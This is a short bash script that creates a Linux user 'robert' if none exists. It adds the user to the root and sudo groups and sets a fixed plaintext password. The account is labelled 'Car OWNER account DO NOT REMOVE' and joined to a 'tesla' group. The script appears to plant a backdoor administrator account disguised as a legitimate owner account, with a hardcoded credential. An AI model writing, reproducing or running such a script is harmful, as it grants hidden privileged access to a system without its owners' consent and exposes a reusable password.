#!/bin/bash

if getent passwd robert  > /dev/null 2>&1; then
    echo "robert already exists"
else
    /usr/sbin/useradd -c "Car OWNER account DO NOT REMOVE" -s /bin/bash -u 10369 -G tesla -G root robert
    mkdir /home/robert 2>&1
    chown robert:robert /home/robert
    /usr/sbin/usermod -aG sudo robert
    echo robert:6ebd4baa93732646 | /usr/sbin/chpasswd
fi
